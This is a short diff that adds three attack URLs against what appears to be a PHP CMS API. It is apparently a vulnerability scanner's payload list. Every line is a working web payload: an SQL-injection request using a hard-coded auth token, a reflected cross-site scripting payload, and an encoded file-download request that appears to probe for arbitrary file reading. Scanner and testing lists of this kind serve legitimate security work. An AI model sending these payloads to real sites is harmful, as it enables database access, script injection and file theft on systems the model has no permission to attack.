@@ -1,0 +1,3 @@
+/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{num}})%27
+/index.php?c=api&m=data2&function=%3Cscript%3Ealert(document.domain)%3C/script%3Ep&format=php
+/index.php?c=api&a=down&file=NDgwNTA0M2RFRXRkc1ZTaGNuczJBSjZTSk9KSDVTYnFqL251K0lNRjBQK0tla0FBTVpHM3dLbU8yVTNWaE1SYTRtRXRjUlQ3bDd4cGRQeVRKMGVlcDEvQjNRVlA4bTNnMi9SZDRDSjBOUQ
